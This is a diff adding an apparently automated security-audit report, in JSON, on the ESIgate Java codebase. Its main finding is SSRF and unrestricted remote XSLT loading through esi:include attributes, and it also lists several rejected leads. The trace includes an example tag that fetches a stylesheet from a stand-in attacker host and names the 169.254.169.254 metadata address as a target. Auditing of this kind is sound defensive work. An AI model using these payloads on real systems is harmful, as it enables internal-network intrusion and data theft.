@@ -1,0 +1,90 @@
+{
+  "candidates": [
+    {
+      "attacker_control": "Fully controlled attribute strings (src, alt, stylesheet) of any esi:include tag present in a response body that ESIgate parses (provider page, nested include responses). Because ResourceUtils accepts absolute http(s) URLs unchanged, a value such as http://169.254.169.254/<path> or http://internal-host:port/ is fetched directly, and stylesheet=http://attacker/x.xsl is downloaded and executed as XSLT. The Esi / parallelesi.Esi extensions are enabled by default (Parameters.java:79-82) and absolute-URL includes are advertised usage (src/site/xdoc/quickstart.xml:76; RemoveElement.java:32).",
+      "confidence": "medium",
+      "counterevidence_checked": "Absolute-URL includes are documented and used in examples (src/site/xdoc/quickstart.xml:76; RemoveElement.java javadoc), so part of this is intended functionality rather than an accidental bug; ESI tags are normally authored by the trusted provider application, so exploitability depends on whether untrusted data can reach an ESI-parsed response (classic ESI-injection precondition, not proven end-to-end here). Searches for allowlist/whitelist/trusted/FEATURE_SECURE_PROCESSING/XMLConstants/ACCESS_EXTERNAL found no code: no allow-list, trusted-host check or secure-processing configuration exists in the snapshot, the Esi capability gate is driven by provider response headers, and no code path validates that the include URL belongs to the selected driver. UriUtils.isAbsolute() recognizes only literal lowercase http:// and https://, so non-http schemes are not directly reachable.",
+      "id": "esi-include-ssrf-xslt",
+      "impact": "Server-side request forgery from the ESIgate host with the response body exfiltrated into the returned page: reach internal-only HTTP services, admin interfaces and cloud metadata endpoints (169.254.169.254), endpoint/port probing, and bypass of the configured provider base URL/mapping trust boundary. The XSLT sink amplifies this: the attacker stylesheet can use xsl:include/document() for further requests or local XML resource access, and where the JAXP implementation permits Java extension functions (Xalan-style) this can escalate to arbitrary code execution in the ESIgate JVM. Self/nested referencing includes also allow unbounded recursion because IncludeElement has no depth limit.",
+      "locations": [
+        {
+          "end_line": 209,
+          "path": "esigate-core/src/main/java/org/esigate/esi/IncludeElement.java",
+          "start_line": 143
+        },
+        {
+          "end_line": 206,
+          "path": "esigate-core/src/main/java/org/esigate/extension/parallelesi/IncludeElement.java",
+          "start_line": 142
+        },
+        {
+          "end_line": 81,
+          "path": "esigate-core/src/main/java/org/esigate/http/ResourceUtils.java",
+          "start_line": 67
+        },
+        {
+          "end_line": 72,
+          "path": "esigate-core/src/main/java/org/esigate/impl/DriverRequest.java",
+          "start_line": 51
+        },
+        {
+          "end_line": 241,
+          "path": "esigate-core/src/main/java/org/esigate/http/HttpClientRequestExecutor.java",
+          "start_line": 227
+        },
+        {
+          "end_line": 312,
+          "path": "esigate-core/src/main/java/org/esigate/util/UriUtils.java",
+          "start_line": 310
+        },
+        {
+          "end_line": 97,
+          "path": "esigate-core/src/main/java/org/esigate/xml/XsltRenderer.java",
+          "start_line": 56
+        },
+        {
+          "end_line": 181,
+          "path": "esigate-core/src/main/java/org/esigate/Driver.java",
+          "start_line": 157
+        }
+      ],
+      "prerequisites": "1) The Esi extension is active (default). 2) An attacker-influenced or malicious provider response reaches the ESI parser containing an esi:include tag (ESI content is assumed to originate from the provider; e.g. user-generated or reflected content that is not HTML-escaped, or a compromised/third-party provider). 3) For the XSLT vector the tag carries a stylesheet attribute (or the attacker hosts the referenced stylesheet). 4) No network egress filtering between ESIgate and the target services. ESIgate itself requires no authentication.",
+      "root_cause": "ESI include processing treats provider-supplied tag attributes as trusted URLs. IncludeElement.processPage() takes the src (or alt) attribute, strips an optional $(PROVIDER{...}) prefix, and calls driver.render(page, ...) with no validation of scheme, host or allowed provider (IncludeElement.java:143-209; identical logic in extension/parallelesi/IncludeElement.java:142-206). Driver.render()/ResourceUtils.getHttpUrlWithQueryString() preserve absolute http/https URLs verbatim (ResourceUtils.java:67-74), DriverRequest marks them external (DriverRequest.java:54) and HttpClientRequestExecutor.createOutgoingRequest() connects to the physical host taken from the URL instead of rewriting it to the configured provider base (HttpClientRequestExecutor.java:227-241; UriUtils.isAbsolute only checks the http/https prefix, UriUtils.java:310-312). The stylesheet attribute additionally selects an arbitrary URL whose content is loaded and compiled as XSLT by XsltRenderer via the default TransformerFactory with no FEATURE_SECURE_PROCESSING, no ACCESS_EXTERNAL restriction and no URIResolver (XsltRenderer.java:56-76 and 89-97).",
+      "title": "Unvalidated esi:include src/stylesheet attributes enable SSRF and unrestricted remote XSLT processing",
+      "trace": "Tag <esi:include src=\"http://internal/x\" stylesheet=\"http://attacker/x.xsl\"/> reaches IncludeElement.onTagEnd() then processPage() (IncludeElement.java:73-82 and 143-207). src has no $(PROVIDER{ prefix, so page=src and driver=current driver (lines 155-157). XsltRenderer(xslt, driver, httpRequest) is constructed (lines 201-203) and inside it driver.render(template, ...) fetches the attacker URL (XsltRenderer.java:70-75). Driver.render() calls ResourceUtils.getHttpUrlWithQueryString (ResourceUtils.java:67), which keeps the absolute URL; the new DriverRequest marks it external (DriverRequest.java:54); createOutgoingRequest computes physicalHost from the URL and skips the provider rewrite because external=true (HttpClientRequestExecutor.java:230-241); execute() performs the call (HttpClientRequestExecutor.java:307-314). The response is parsed by EsiRenderer and, for stylesheet, compiled by TRANSFORMER_FACTORY.newTransformer(new StreamSource(...)) (XsltRenderer.java:91) with no secure-processing configuration. For the src fetch, driver.render(page, ...) uses the same unvalidated URL and the response body is appended to the parent page (IncludeElement.java:204-207; parallelesi equivalent 201-204).",
+      "unverified": "Not runtime-confirmed. Whether an attacker can seed ESI tags into a provider response (or whether providers are fully trusted in a given deployment) cannot be established from source alone. Precise JAXP behavior (document()/external entity access, Java extension-function availability) depends on the JDK/Xalan implementation actually deployed and was not executed. The intended security policy for remote stylesheets is ambiguous (reference.xml:779-784 describes remote stylesheet lookup as a supported fallback).",
+      "weakness_type": "CWE-918 Server-Side Request Forgery compounded by unsafe XSLT/external-resource processing"
+    }
+  ],
+  "coverage_summary": "Source scope reports 302 visible files with parity between B0/P1 filters; binary-like files refused and no symlinks/sensitive-name exclusions. P1 relation index reports complete indexing of the same 302 files (1,897 symbols, 3,282 edges, 55 navigation facts) with no missing files and no SAST/findings loaded. I inventoried all modules and read/traced the core ESI, HTTP client/URL resolution, XSLT/XPath, driver/config, cookie, surrogate, cache, servlet/server and CAS code, verifying index hints against source text. The snapshot excludes test sources (e.g. org.esigate.test.HttpResponseBuilder imported by ErrorPages.java is absent, and root pom.xml notes that package is compiled with provided JUnit), so no test-confirmed intent or regression tests could be inspected.",
+  "limitations": [
+    "Read-only source review; no code execution, dependency resolution, build or runtime testing was performed.",
+    "Exploitability of the submitted candidate depends on an ESI-injection precondition (attacker-influenced content in a response parsed by ESIgate) that cannot be proven from the snapshot alone; this doubt is recorded.",
+    "XSLT/JAXP behavior (document(), external entities, Java extension functions) is JDK-implementation dependent and was not executed.",
+    "Test sources and the org.esigate.test helper package are filtered out of the visible snapshot, so behavior/intent could not be cross-checked against tests.",
+    "The P1 relation index is syntactic only; edges are navigational candidates and were verified in source where used."
+  ],
+  "rejected_leads": [
+    {
+      "lead": "Client-controlled X_REMOTE_USER identity spoofing: FilteredRequest.getRemoteUser() returns the client-supplied X_REMOTE_USER header (esigate-servlet/src/main/java/org/esigate/servlet/user/FilteredRequest.java:37-44) and HeaderManager forwards client headers without stripping it (HeaderManager.java:60-74, 108-122), while RemoteUserAuthenticationHandler adds the same header with addHeader (RemoteUserAuthenticationHandler.java:42-52).",
+      "reason": "Direct attacker control and real auth-bypass impact, but only in deployments that trust the header (provider-side ConnectorFilter, mostly sample apps). The header is ESIgate's own inter-application convention and source alone does not establish it as the intended trust anchor; deployment-dependent, kept as secondary lead rather than the submitted candidate."
+    },
+    {
+      "lead": "Path traversal / mapping escape via non-normalized client request path: selectProvider uses requestURI.getPath() without canonicalization (DriverFactory.java:243-255) and ResourceUtils.concatUrl concatenates it to the provider base (ResourceUtils.java:56-65).",
+      "reason": "Impact depends entirely on front-container handling of dot segments and provider-side path resolution, which cannot be verified statically in this snapshot; no local normalization sink was confirmed."
+    },
+    {
+      "lead": "InlineCache is an unsynchronized, process-global, unbounded map of ESI inline fragments keyed only by name (InlineCache.java:21-36; InlineElement.java:52-56; parallelesi variant identical), read from IncludeElement.processPage (lines 184-188).",
+      "reason": "Cross-user fragment disclosure/DoS is theoretically possible but also requires ESI injection, and esi:inline names are trusted template identifiers; impact and reachability unverified."
+    },
+    {
+      "lead": "CAS handler appends proxy tickets after a weak Location substring check (CasAuthenticationHandler.java:75-92 and 118-127).",
+      "reason": "Re-reading addCasAuthentication shows the ticket is appended to the original outgoing request URI, not to the attacker-controlled Location header, so no ticket leak to an arbitrary host could be established."
+    },
+    {
+      "lead": "Minor robustness/DoS issues: NumberFormatException from client Host header port parsing (HttpRequestHelper.java:64-81), CacheAdapter NPE when the cache-status attribute is absent (CacheAdapter.java:98-109), unbounded growth of the static InlineCache.",
+      "reason": "Low security impact and/or unclear reachability; not competitive with the primary candidate."
+    }
+  ],
+  "summary": "Reviewed the ESIgate 5.3-SNAPSHOT source tree (302 visible files: esigate-core, esigate-servlet, esigate-server, esigate-cas and sample apps). The strongest source-supported lead is in the core ESI include processing: attribute values from esi:include tags found in provider responses (src, alt, stylesheet) are used without any scheme/host allow-list to drive server-side HTTP fetches and XSLT compilation. Absolute http(s) URLs are passed through unchanged, and the fetched stylesheet is compiled with the JVM-default TransformerFactory with no secure-processing or external-access restrictions. This yields a server-side request forgery primitive (response body returned into the aggregated page) plus arbitrary XSLT execution (further outbound requests, local XML resource access and, implementation-dependent, Java extension-function calls). A secondary directly client-controlled lead (client-supplied X_REMOTE_USER trusted by the shipped ConnectorFilter while the proxy forwards the client's own header) and several weaker leads were considered and rejected or left unconfirmed."
+}
